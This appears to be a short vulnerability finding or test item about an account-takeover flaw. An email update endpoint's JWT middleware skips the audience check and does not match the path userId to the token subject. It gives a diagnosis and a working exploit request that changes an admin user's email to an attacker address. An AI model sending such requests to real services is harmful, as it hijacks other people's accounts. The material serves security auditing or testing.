diagnosis: The email update handler relies on a JWT verification middleware that omits audience checking and fails to verify that req.params.userId matches req.user.sub. A token issued for an unprivileged service or belonging to any user can be used against /api/user-profiles/:userId/update-email to hijack another user's email address.
exploit_request:
POST /api/user-profiles/usr-admin-8821/update-email HTTP/1.1
Host: accounts.cloudid.io
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5c...
Content-Type: application/json

{
  "newEmail": "attacker@takeover.com"
}
